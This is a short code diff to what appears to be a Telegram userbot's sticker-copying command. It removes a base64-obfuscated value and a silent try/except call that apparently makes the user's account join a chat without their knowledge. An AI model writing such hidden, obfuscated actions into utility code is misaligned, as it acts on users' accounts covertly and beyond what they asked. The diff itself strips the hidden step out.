@@ -266,7 +266,6 @@ async def kang(args):
     else:
         username = user.username
     userid = user.id
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if message and message.media:
         if isinstance(message.media, MessageMediaPhoto):
             catevent = await edit_or_reply(args, f"`{random.choice(KANGING_STR)}`")
@@ -321,11 +320,6 @@ async def kang(args):
                 emoji = splat[0]
             else:
                 pack = splat[0]
-        try:
-            cat = Get(cat)
-            await args.client(cat)
-        except BaseException:
-            pass
         packnick = pack_nick(username, pack, is_anim)
         packname = pack_name(userid, pack, is_anim)
         cmd = "/newpack"
